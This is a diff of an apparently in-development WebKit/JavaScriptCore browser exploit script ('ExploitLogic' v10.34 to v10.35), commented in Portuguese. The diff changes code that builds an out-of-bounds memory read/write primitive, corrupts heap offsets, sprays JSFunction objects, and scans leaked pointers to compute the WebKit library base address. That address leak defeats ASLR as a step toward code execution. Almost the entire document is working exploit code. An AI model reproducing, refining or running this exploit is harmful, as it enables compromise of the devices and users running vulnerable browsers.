@@ -14,36 +14,34 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.34";
+const FNAME_MAIN = "ExploitLogic_v10.35";
 
-const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_34";
+const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_35";
 const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
 const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;
 
-let getter_copy_called_flag_v10_34 = false;
+let getter_copy_called_flag_v10_35 = false;
 
 // ============================================================
 // PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
 // ============================================================
 async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
+    // ... (Corpo como na v10.34 - sem alterações)
     const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
-    getter_copy_called_flag_v10_34 = false;
-
+    getter_copy_called_flag_v10_35 = false;
     if (!oob_array_buffer_real || !oob_dataview_real) {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
     }
     oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
-
     const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
     oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);
-
     const getterObjectForCopy = {
         get [GETTER_PROPERTY_NAME_COPY]() {
-            getter_copy_called_flag_v10_34 = true;
+            getter_copy_called_flag_v10_35 = true;
             try {
                 const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                 const effective_read_offset = qword_at_0x68.high();
@@ -54,22 +52,22 @@ async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
                     } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
                 } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
             } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
-            return "getter_copy_v10_34_done";
+            return "getter_copy_v10_35_done";
         }
     };
     oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
     await PAUSE_S3(5);
     try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
-    if (!getter_copy_called_flag_v10_34) { return null; }
+    if (!getter_copy_called_flag_v10_35) { return null; }
     return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
 }
 
 // ============================================================
-// FUNÇÃO PRINCIPAL (v10.34 - Log Detalhado de Base e Heurística Relaxada)
+// FUNÇÃO PRINCIPAL (v10.35 - Heurística de Base Ajustada e Log de Candidatos)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakWebKitPointer_v10.34`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Vazar Ponteiro WebKit (Heurística Relaxada) ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakWebKitPointer_v10.35`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Vazar Ponteiro WebKit (Heurística de Base Ajustada) ---`, "test", FNAME_CURRENT_TEST);
 
     let sprayedObjects = [];
 
@@ -78,29 +76,29 @@ export async function sprayAndInvestigateObjectExposure() {
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        // 1. Validar Primitiva de Cópia
-        const VALIDATION_OFFSET = 0x2A0;
+        // PASSO 1: Validar Primitiva de Cópia (mantido)
+        const VALIDATION_OFFSET = 0x2A0; 
         const VALIDATION_QWORD = new AdvancedInt64(0x1A2B3C4D, 0x5E6F7A8B); // O valor candidato do seu log anterior
         oob_write_absolute(VALIDATION_OFFSET, VALIDATION_QWORD, 8);
         let copied_validation = await readFromOOBOffsetViaCopy(VALIDATION_OFFSET);
         if (copied_validation && copied_validation.equals(VALIDATION_QWORD)) {
-            logS3("  PASSO 1: Primitiva de cópia validada com o valor candidato anterior.", "good", FNAME_CURRENT_TEST);
+            logS3("  PASSO 1: Primitiva de cópia validada com sucesso.", "good", FNAME_CURRENT_TEST);
         } else {
-            logS3(`  PASSO 1: FALHA na validação da primitiva de cópia. Lido: ${copied_validation ? copied_validation.toString(true): "null"}. Esperado: ${VALIDATION_QWORD.toString(true)}. Abortando.`, "critical", FNAME_CURRENT_TEST);
+            logS3(`  PASSO 1: FALHA na validação da primitiva de cópia. Lido: ${copied_validation ? copied_validation.toString(true): "null"}. Abortando.`, "critical", FNAME_CURRENT_TEST);
             return;
         }
         await PAUSE_S3(50);
 
-        // 2. Pulverizar JSFunctions
+        // PASSO 2: Pulverizar Objetos JSFunction (mantido)
         logS3("PASSO 2: Pulverizando objetos JSFunction...", "info", FNAME_CURRENT_TEST);
         const NUM_SPRAY_FUNCS = 400;
         for (let i = 0; i < NUM_SPRAY_FUNCS; i++) {
-            sprayedObjects.push(function(_a,_b,_c,_d,_e,_f,_g,_h,_i,_j) { return 0xBEEF0000 + i + _j; });
+            sprayedObjects.push(function() { return 0xCAFEBEEF + i; });
         }
         logS3(`  ${sprayedObjects.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
         await PAUSE_S3(500);
 
-        // 3. Escanear
+        // PASSO 3: Escanear o oob_array_buffer_real
         const SCAN_START = 0x080;
         const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20);
         const SCAN_STEP = 0x08; 
@@ -113,8 +111,8 @@ export async function sprayAndInvestigateObjectExposure() {
         }
 
         let webkitBaseLeaked = null;
-        let potentialLeakCandidatesInfo = [];
-        const executablePtrFieldOffset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET; // 0x18
+        let allPotentialLeakCandidates = []; // Para armazenar todos os ponteiros que passam na heurística inicial
+        const executablePtrFieldOffset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;
 
         for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) {
             let offset_to_read_executable_ptr = cell_base_offset + executablePtrFieldOffset;
@@ -127,8 +125,9 @@ export async function sprayAndInvestigateObjectExposure() {
             const isPtrBadMagic = isAdvancedInt64Object(potential_executable_ptr) && potential_executable_ptr.low() === 0xBAD68BAD && potential_executable_ptr.high() === 0xBAD68BAD;
 
             if (potential_executable_ptr && !isPtrZero && !isPtrBadRead && !isPtrBadMagic ) {
-                if (potential_executable_ptr.high() !== 0 && potential_executable_ptr.high() !== 0xFFFFFFFF ) { // Heurística ampla
-                    potentialLeakCandidatesInfo.push({
+                // Heurística inicial para um ponteiro: parte alta não é zero nem toda FF.
+                if (potential_executable_ptr.high() !== 0 && potential_executable_ptr.high() !== 0xFFFFFFFF ) {
+                    allPotentialLeakCandidates.push({
                         read_from_oob_offset: offset_to_read_executable_ptr,
                         ptr_value: potential_executable_ptr,
                         origin_cell_base: cell_base_offset
@@ -136,16 +135,17 @@ export async function sprayAndInvestigateObjectExposure() {
                 }
             }
             if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 256) === 0) { 
-                logS3(`    Scan por Executable* em ${toHex(cell_base_offset)}... Candidatos: ${potentialLeakCandidatesInfo.length}`, "info", FNAME_CURRENT_TEST);
+                logS3(`    Scan por Executable* em ${toHex(cell_base_offset)}... Candidatos brutos: ${allPotentialLeakCandidates.length}`, "info", FNAME_CURRENT_TEST);
                 await PAUSE_S3(1); 
             }
         } // Fim do loop de scan
 
-        logS3(`  Scan concluído. ${potentialLeakCandidatesInfo.length} ponteiros candidatos (Executable*) encontrados. Analisando...`, "info", FNAME_CURRENT_TEST);
+        logS3(`  Scan concluído. ${allPotentialLeakCandidates.length} ponteiros candidatos brutos (Executable*) encontrados. Analisando bases...`, "info", FNAME_CURRENT_TEST);
 
-        for (const cand of potentialLeakCandidatesInfo) {
+        for (const cand of allPotentialLeakCandidates) {
             const leaked_ptr = cand.ptr_value;
-            logS3(`  Analisando candidato ${leaked_ptr.toString(true)} (lido de oob[${toHex(cand.read_from_oob_offset)}], célula base provável ${toHex(cand.origin_cell_base)}):`, "info", FNAME_CURRENT_TEST);
+            // Logar o candidato que está sendo processado
+            // logS3(`  Analisando candidato ${leaked_ptr.toString(true)} (lido de oob[${toHex(cand.read_from_oob_offset)}]):`, "info", FNAME_CURRENT_TEST);
             for (const funcName in functionOffsets) {
                 const funcOffsetStr = functionOffsets[funcName];
                 if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
@@ -153,17 +153,20 @@ export async function sprayAndInvestigateObjectExposure() {
                     const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
                     const potential_base_addr = leaked_ptr.sub(funcOffsetAdv);
                     
+                    // Heurística AJUSTADA para endereço base: Alinhado E parte alta > 0 e < 0x80000 (um limite superior maior)
                     const isAligned = (potential_base_addr.low() & 0xFFF) === 0;
-                    // Heurística de faixa para base (pode precisar de ajuste)
-                    const isInRange = potential_base_addr.high() > 0x0 && potential_base_addr.high() < 0x80000; // Aumentado limite superior para high
+                    const isHighPartPlausible = potential_base_addr.high() > 0x0 && potential_base_addr.high() < 0x80000; 
 
-                    logS3(`    - subtraindo ${funcName} (${funcOffsetAdv.toString(true)}) -> Base: ${potential_base_addr.toString(true)} ${isAligned ? "<-- ALINHADO!" : ""}`, "info", FNAME_CURRENT_TEST);
+                    // Logar todos os cálculos de base que são pelo menos alinhados
+                    if (isAligned) {
+                         logS3(`    - Ptr: ${leaked_ptr.toString(true)} (de ${toHex(cand.read_from_oob_offset)}) - Func: ${funcName} (${funcOffsetAdv.toString(true)}) -> Base: ${potential_base_addr.toString(true)} ${isHighPartPlausible ? "<-- ALINHADO & FAIXA OK" : "<-- ALINHADO (Faixa High?)"}`, "info", FNAME_CURRENT_TEST);
+                    }
 
-                    if (isAligned && isInRange) {
-                        logS3(`      !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIALMENTE ENCONTRADO !!!!`, "vuln", FNAME_CURRENT_TEST);
-                        logS3(`        Ponteiro Executable*: ${leaked_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
-                        logS3(`        Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
-                        logS3(`        Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+                    if (isAligned && isHighPartPlausible) {
+                        logS3(`      !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
+                        logS3(`        Ponteiro: ${leaked_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+                        logS3(`        Função: '${funcName}' (offset: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
+                        logS3(`        Base Calculada: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                         document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
                         webkitBaseLeaked = potential_base_addr;
                         break; 
@@ -173,15 +176,14 @@ export async function sprayAndInvestigateObjectExposure() {
             if (webkitBaseLeaked) break;
         }
 
-
         if (webkitBaseLeaked) {
             logS3("VAZAMENTO DE ENDEREÇO BASE DO WEBKIT PARECE BEM-SUCEDIDO!", "good", FNAME_CURRENT_TEST);
         } else {
-            logS3("Não foi possível vazar o endereço base do WebKit nesta execução.", "warn", FNAME_CURRENT_TEST);
-            if (potentialLeakCandidatesInfo.length > 0) {
-                logS3(`  ${potentialLeakCandidatesInfo.length} QWORDs candidatos a ponteiro foram analisados. Verifique os logs detalhados acima para encontrar padrões ou bases alinhadas manualmente.`, "info", FNAME_CURRENT_TEST);
+            logS3("Não foi possível vazar o endereço base do WebKit automaticamente nesta execução.", "warn", FNAME_CURRENT_TEST);
+            if (allPotentialLeakCandidates.length > 0) {
+                logS3(`  ${allPotentialLeakCandidates.length} ponteiros candidatos foram analisados. Revise os logs "Base: XXXXXXXX_XXXXXXXX <-- ALINHADO!" para encontrar manualmente.`, "info", FNAME_CURRENT_TEST);
             } else {
-                logS3("  Nenhum QWORD candidato a Executable* passou na heurística inicial.", "info", FNAME_CURRENT_TEST);
+                logS3("  Nenhum ponteiro candidato passou na heurística inicial.", "info", FNAME_CURRENT_TEST);
             }
         }
 
